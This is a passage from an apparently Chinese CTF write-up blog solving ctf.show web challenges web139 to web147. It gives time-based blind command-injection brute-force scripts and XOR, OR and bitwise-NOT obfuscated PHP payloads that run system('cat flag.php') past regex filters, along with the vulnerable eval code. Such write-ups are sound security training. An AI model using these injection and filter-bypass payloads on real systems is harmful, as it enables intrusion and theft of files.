operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">'_~'</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#行</span>    key<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#列</span>        <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token comment">#awk 'NR==&#123;0&#125;'逐行输出获取</span>        <span class="token comment">#cut -c &#123;1&#125; 截取单个字符</span>            payload<span class="token operator">=</span><span class="token string">"if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>            <span class="token comment">#print(payload)</span>            url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result<span class="token operator">=</span>result<span class="token operator">+</span>n                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token string">'~'</span><span class="token punctuation">:</span>                key<span class="token operator">=</span><span class="token number">1</span>                result<span class="token operator">+=</span><span class="token string">" "</span></code></pre><p><strong>cat &#x2F;f149_15_h3r3</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">"-"</span>result<span class="token operator">=</span><span class="token string">""</span>key<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">"if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>n            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web140-php-intval"><a href="#web140-php-intval" class="headerlink" title="web140(php &#x3D;&#x3D;  intval)"></a>web140(php &#x3D;&#x3D;  intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$f1</span></span>(<span class="token interpolation"><span class="token variable">$f2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://blog.csdn.net/qq_47804678/article/details/128814377">php比较绕过（强比较“&#x3D;&#x3D;&#x3D;”&#x2F;弱比较“&#x3D;&#x3D;“）</a></p><p>因为是<code>==</code>，字符串和数字比较时，会将字符串先转化成数字类型在进行比较。</p><p>字符串以数字开头时，以开头数字（到字母出现截止）作为转换结果；开头不是数字的字符串或空（null），则转换为0。</p><blockquote><p>‘12’&#x3D;&#x3D;12    &#x2F;&#x2F;true<br>‘12abc’&#x3D;&#x3D;12 &#x2F;&#x2F;true<br>‘adm2n’&#x3D;&#x3D;0  &#x2F;&#x2F;true</p></blockquote><p>所以只需要$code的值不为1开头的字符串即可，于是构造让其返回0</p><blockquote><p>intval() 成功时，返回参数的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。<br>字符串有可能返回 0，取决于字符串最左侧的字符。<br>intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p></blockquote><p>Payload:</p><blockquote><p>system(system())—&gt; f1&#x3D;system&amp;f2&#x3D;system</p><p>string system( string $command[, int &amp;$return_var] )：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(‘FLASE’)，空指令，失败返回FLASE。</p><p>usleep(usleep())—&gt; f1&#x3D;usleep&amp;f2&#x3D;usleep<br>usleep没有返回值。 所以intval参数为空，失败返回0</p><p>getdate(getdate())—&gt; f1&#x3D;getdate&amp;f2&#x3D;getdate</p><p>array getdate([ int $timestamp &#x3D; time()] )：返回结果是array，参数必须是int型。所以getdate(getdate())—-&gt;getdate(array型)—&gt;失败返回flase，intval为0。</p></blockquote><h4 id="web141-函数与数字运算"><a href="#web141-函数与数字运算" class="headerlink" title="web141(函数与数字运算)"></a>web141(函数与数字运算)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>\W</strong>：与任何非单词字符匹配。就是除了数字、字母、下划线。等价于<code>[^A-Za-z0-9_]</code></p><p>php里数字可以和命令可以进行运算。也就是说v3里要执行的函数前后加上运算符即可。</p><p>举例理解一下：<code>1-phpinfo()-1</code>的结果为0，phpinfo()执行成功返回true，1-1-1&#x3D;-1。</p><p>同理<code>system()</code>也可执行。</p><p>取反<code>~</code>异或<code>^</code>或<code>|</code>都可以</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Payload:</p><blockquote><p>?v1&#x3D;1&amp;v2&#x3D;0&amp;v3&#x3D;%2b(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%03%01%14%00%06%0c%01%07%00%10%08%10”|”%60%60%60%20%60%60%60%60%2e%60%60%60”)%2b</p><p>%2b&#x3D;+</p><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;-(<del>‘%8C%86%8C%8B%9A%92’)(</del>‘%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F’)-</p></blockquote><h4 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p>0和0x0绕过 这里绕过因为是因为当成了8进制和16进制</p><h4 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>同142，ban了取反和或同时也ban了+-可以使用*，好像没ban异或<code>^</code></p><p>Payload:<code>?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)*</code></p><h4 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">1</span><span class="token operator">?</span><span class="token constant boolean">true</span><span class="token punctuation">:</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>限制了v3的长度，并对v2进行check,可以使用<code>|``^</code>只是调换位置罢了</p><p>Payload:<code>?v1=1&amp;v2=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)&amp;v3=-</code></p><h4 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>正则运算都被ban了，可以使用<code>|</code>和<code>~</code>或者三目运算符，另外<code>&quot;</code>也被ban了，可以使用<code>&#39;</code></p><p>Payload:</p><blockquote><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;|(‘%13%19%13%14%05%0d’|’%60%60%60%60%60%60’)(‘%14%01%03%00%06%0c%01%07%02%10%08%10’|’%60%60%60%20%60%60%60%60%2c%60%60%60’)|</p><p>?v1&#x3D;%0a1&amp;v2&#x3D;%0a0&amp;v3&#x3D;?(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5):</p></blockquote><h4 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h4><p>三目运算符被ban了，但是影响不大</p><h4 id="web147-PHP命名空间-create-function函数代码注入"><a href="#web147-PHP命名空间-create-function函数代码注入" class="headerlink" title="web147(PHP命名空间  create_function函数代码注入)"></a>web147(PHP命名空间  create_function函数代码注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string 